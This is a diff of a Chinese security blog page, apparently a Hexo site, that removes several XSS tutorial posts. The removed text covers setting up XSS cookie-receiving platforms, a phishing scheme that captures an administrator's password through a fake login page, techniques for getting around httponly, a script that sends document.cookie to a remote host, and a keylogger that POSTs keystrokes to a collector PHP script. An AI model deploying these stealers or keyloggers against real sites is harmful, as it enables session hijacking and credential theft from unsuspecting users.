-<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
-<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
-<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
-</ul>
-</li>
-</ul>
-<h4 id="21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS"><a href="#21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS" class="headerlink" title="21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]"></a>21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]</h4>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--XSS%E5%B9%B3%E5%8F%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/02/XSS--XSS%E5%B9%B3%E5%8F%B0/" itemprop="url">XSS--XSS平台</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
-                2020-04-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index">
-                    <span itemprop="name">XSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-外用XSS平台"><a href="#1-外用XSS平台" class="headerlink" title="1. 外用XSS平台"></a>1. 外用XSS平台</h4><ul>
-<li>XSS平台注册</li>
-<li>cookie<ul>
-<li>创建模块</li>
-<li>项目名称</li>
-<li>默认模块 -&gt; keepsession</li>
-<li>生成项目代码</li>
-</ul>
-</li>
-<li>工具：COOKIE强力注入工具（小马）-&gt; 漏洞页面+COOKIE输入 -&gt; 强制修改 -&gt; 浏览尝试</li>
-<li>工具：Firefox浏览器Cookies Manager -&gt; 搜索 -&gt; Add Cookie（添加一个或多个）</li>
-<li>XSS平台<ul>
-<li>webhack platfrom：<a href="http://www.webhack.cn/" target="_blank" rel="noopener">http://www.webhack.cn/</a></li>
-<li>xsshs：<a href="https://xsshs.cn/" target="_blank" rel="noopener">https://xsshs.cn/</a></li>
-</ul>
-</li>
-</ul>
-<h4 id="2-个人XSS平台（BlueLotus）"><a href="#2-个人XSS平台（BlueLotus）" class="headerlink" title="2. 个人XSS平台（BlueLotus）"></a>2. 个人XSS平台（BlueLotus）</h4><ul>
-<li>原项目地址：<a href="https://github.com/firesunCN/_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/_XSSReceiver</a></li>
-<li>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></li>
-<li>安装博客链接：<a href="https://www.cnblogs.com/blacksunny/p/8401688.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/8401688.html</a></li>
-<li>实验环境<ul>
-<li>服务器：CentOS</li>
-<li>Web容器：Apache</li>
-<li>脚本语言：PHP</li>
-</ul>
-</li>
-<li>安装Apache<ul>
-<li>yum install httpd –y</li>
-<li>service httpd start</li>
-<li>浏览器访问<a href="http://IP地址尝试，能否访问到页面" target="_blank" rel="noopener">http://IP地址尝试，能否访问到页面</a></li>
-</ul>
-</li>
-<li>安装PHP<ul>
-<li>yum install php –y</li>
-</ul>
-</li>
-<li>安装Git<ul>
-<li>yum install git –y</li>
-</ul>
-</li>
-<li>源码存放<ul>
-<li>从Github上下载源码</li>
-<li>mkdir /var/www/html/xss</li>
-<li>存放源码到/xss目录中</li>
-<li>chomd -R 777 /var/www/html/xss（此平台一些文件夹需可读可写可执行权限）</li>
-</ul>
-</li>
-<li>配置虚拟主机<ul>
-<li>新建虚拟主机配置文件夹：mkdir/etc/httpd/conf/vhost</li>
-<li>新建虚拟主机配置文件：vi /etc/httpd/conf/vhost/httpd-vhosts.conf</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/xss&quot;</span><br><span class="line">    DirectoryIndex admin.php</span><br><span class="line">    ServerName xss.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/web&quot;</span><br><span class="line">    DirectoryIndex index.php</span><br><span class="line">    ServerName web.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/kodex&quot;</span><br><span class="line">    DirectoryIndex index.php</span><br><span class="line">    ServerName kodex.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>配置Apache<ul>
-<li>备份配置文件：cp/etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak</li>
-<li>编辑配置文件：vi/etc/httpd/conf/httpd.conf<ul>
-<li>DocumentRoot “/var/www/html”</li>
-<li>Options ExecCGIFollowSymLinks（允许服务器使用CGI，在Directory的/var/www/html目录下）</li>
-<li>AllowOverrideAll（在Directory的/var/www/html目录下）</li>
-<li>插入：Include/etc/httpd/conf/vhost/httpd-vhosts.conf</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>重启Apache：service httpd restart</li>
-<li>安装平台<ul>
-<li>访问http://服务器IP地址</li>
-<li>设置后台登录密码、数据加密密码<ul>
-<li>其余选项可保持默认，然后提交</li>
-<li>▲ 一定记得要修改</li>
-<li>▲ 若提示data/template/myjs三个存储路径需要写权限，可在/xss目录下进行修改</li>
-</ul>
-</li>
-<li>安装成功</li>
-</ul>
-</li>
-<li>登陆访问尝试以及平台测试（获取Cookie）<ul>
-<li>访问http://服务器IP地址/login.php</li>
-<li>配置公共模板default.js，修改js代码中的网站地址为http://服务器IP地址/index.php</li>
-<li>最后，点击下方的修改，保存修改</li>
-<li>进入”我的js”模块</li>
-<li>设置js文件名称</li>
-<li>选择default.js模板</li>
-<li>插入模板</li>
-<li>新增保存js测试代码</li>
-<li>生成payload</li>
-<li>站点尝试是否能打到cookie（即使http-only也会返回一定数据）</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-多人用XSS平台"><a href="#3-多人用XSS平台" class="headerlink" title="3. 多人用XSS平台"></a>3. 多人用XSS平台</h4><ul>
-<li>▲ 修改已有XSS平台的代码，然后搭建在自己的服务器上</li>
-<li>Window Server 2003 -&gt;  iis搭建xss平台套装（ZkeysPHP、xs.zip、ISAPI_Rewrite3）<ul>
-<li>Window Server 2003绑定静态IP<ul>
-<li>需要一个固定IP，若要提供外网使用，需要一个外网IP</li>
-</ul>
-</li>
-<li>安装iis -&gt; 开始 -&gt; 管理工具 -&gt; IIS -&gt; 网站 -&gt; 默认网站</li>
-<li>默认网站 -&gt; 网站根目录 -&gt; 清除源码 -&gt; 拷贝xs.zip中的源码到文件夹</li>
-<li>安装ZkeysPHP（php+mysql环境）</li>
-<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
-<li>用户名：root / 密码：zkeys</li>
-<li>创建数据库xss</li>
-<li>导入 -&gt; 浏览 -&gt; 网站根目录 -&gt; xssplatform.sql -&gt; 执行</li>
-<li>SQL -&gt; UPDATE oc_moudle SET code=REPLACE(code,’<a href="http://xsser.me&#39;,&#39;http://Window" target="_blank" rel="noopener">http://xsser.me&#39;,&#39;http://Window</a> Server 2003的IP’)</li>
-</ul>
-</li>
-<li>网站根目录 -&gt; config.php -&gt; 查看配置是否修改（urlroot等）</li>
-<li>物理机访问Window Server 2003的IP/index.php查看是否访问得到<ul>
-<li>可添加index.php为网站默认页，通过默认网站 -&gt; 属性 -&gt; 文档 -&gt; 添加 -&gt; index.php -&gt; 应用</li>
-<li>进行用户名，密码邮箱的注册，并登陆</li>
-</ul>
-</li>
-<li>创建XSS项目</li>
-<li>▲ 若无法盗取cookie，进行ISAPI_Rewrite3软件的安装<ul>
-<li>默认安装 -&gt; 开始 -&gt; Helicon -&gt; ISAPI_Rewrite3 -&gt; 默认站点 -&gt; 编辑 -&gt; 应用</li>
-</ul>
-</li>
-<li>▲ 邀请码模式<ul>
-<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
-<li>用户名：root / 密码：zkeys</li>
-<li>点击oc_user表，修改刚新添加的用户的adminLevel级别为1</li>
-<li>执行</li>
-</ul>
-</li>
-<li>修改权限（网站根目录）<ul>
-<li>权限设置：shift所有的目录 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
-<li>权限设置：shift所有的文件 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
-<li>对网站根目录设置权限：右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作（▲ PHP需求）</li>
-</ul>
-</li>
-<li>浏览器访问<a href="http://Window" target="_blank" rel="noopener">http://Window</a> Server 2003的IP/index.php?do=user&amp;act=invite</li>
-<li>进行生成邀请码</li>
-<li>邀请码注册尝试</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--Cookie%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/02/XSS--Cookie%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/" itemprop="url">XSS--Cookie与键盘记录器</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
-                2020-04-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index">
-                    <span itemprop="name">XSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  926 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Cookie的获取"><a href="#1-Cookie的获取" class="headerlink" title="1. Cookie的获取"></a>1. Cookie的获取</h4><ul>
-<li>反射型XSS的cookie获取</li>
-<li>存储型XSS的cookie获取</li>
-<li>http-only启用时获取登陆密码（钓鱼方式）<ul>
-<li>钓鱼准备<ul>
-<li>伪造一个完全相同的登陆界面a.html（可通过右键保存页面为html）</li>
-<li>编写一个a.php，用于接收a.html的传值并跳转到b.php</li>
-<li>编写一个b.php，用于传值后跳转到正常的登陆界面</li>
-</ul>
-</li>
-<li>攻击者往有xss漏洞的地方传入访问a.html的代码</li>
-<li>管理员登陆后台，触发攻击者插入的html代码，弹窗显示a.html界面<ul>
-<li>若想要逼真，可通过js代码展示”登陆超时，请重新登陆的”</li>
-</ul>
-</li>
-<li>管理员输入账号密码进行登陆，然后通过b.php跳转到正常登陆页面</li>
-<li>攻击者接收到管理员输入的账号密码</li>
-<li>▲ Linux平台和Windows平台克隆下来的界面源代码可能出现编码问题</li>
-<li>▲ 每次点击一次管理界面，都会触发一次xss代码</li>
-</ul>
-</li>
-<li>httponly下的攻击手法（来自Se7en）<ul>
-<li>phpinfo页<ul>
-<li>伪造对方身份访问同站的phpinfo页面，因为同域所以通过ajax提交访问可以读取到responseText，其中<code>$_SERVER[&quot;HTTP_COOKIE&quot;]</code>会打印出具有httponly属性的cookies</li>
-<li>优点：成功率很高，最不容易被察觉，也是最常用的一种方式</li>
-<li>缺点：需要phpinfo页，条件苛刻</li>
-</ul>
-</li>
-<li>框架钓鱼<ul>
-<li>通过<iframe>标签嵌入一个远程域，完全撑开后，以覆盖原有的页面</li>
-<li>优点：无跳转，域名无改变</li>
-<li>缺点：通常会覆盖某个正常的页面，管理员易察觉</li>
-</ul>
-</li>
-<li>跳转钓鱼<ul>
-<li>通过购买相似域名，构建相同的钓鱼页面，使受害者跳转至钓鱼站</li>
-<li>优点：主动性较强，可主动钓鱼</li>
-<li>缺点：成本较高，且由于页面跳转过于明显，所以此方法十分容易被发现</li>
-</ul>
-</li>
-<li>历史密码<ul>
-<li>通过js伪造登录表单，欺骗浏览器自动填入，由此获取浏览器记住的历史密码</li>
-<li>优点：不易被发现，可直接获取明文，成功率较高</li>
-<li>缺点：各内核浏览器兼容性不一，最新版google已不支持http协议下的自动填入功能</li>
-</ul>
-</li>
-<li>获取源码<ul>
-<li>通过xss获取后端页面源码，常常可以发现一些越权访问，或者配合CSRF打组合拳去添加新用户或者执行其他的功能，以及通过审计后台js发现一些漏洞等</li>
-<li>优点：信息获取的比较详细，也可以获取到后台账号名称</li>
-<li>缺点：局限性较大，不易于利用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>编写接收cookie代码：简单形式a.js+cookie.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//a.js</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    var cookie = document.cookie;</span><br><span class="line">    var url = &quot;http://127.0.0.1/cookie.php?x=&quot;;</span><br><span class="line">    windows.location.href=url_cookie;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">//cookie.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[&apos;x&apos;];</span><br><span class="line">    $file = fopen(&quot;cookie.txt&quot;,&quot;w+&quot;);</span><br><span class="line">    fwrite($file,$cookie);</span><br><span class="line">    fclose($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>编写接收cookie代码：极简模式b.js-2+cookies.php<ul>
-<li>b.js放于80端口，cookies.php是不存在的</li>
-<li>▲ 需要监听b.js中设定的端口</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src=&quot;http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-键盘记录器"><a href="#2-键盘记录器" class="headerlink" title="2. 键盘记录器"></a>2. 键盘记录器</h4><ul>
-<li>三个文件位于同个目录</li>
-<li>Keylogger.js</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Keylogger.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>keylog.txt，不需要有数据，但需要有可读可写的权限</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3092,7 +2919,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">181</span>
+                  <span class="site-state-item-count">184</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3103,7 +2930,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -3114,7 +2941,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -3199,7 +3026,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">176.3k</span>
+    <span title="Site words total count">179.7k</span>
   
 </div>
 
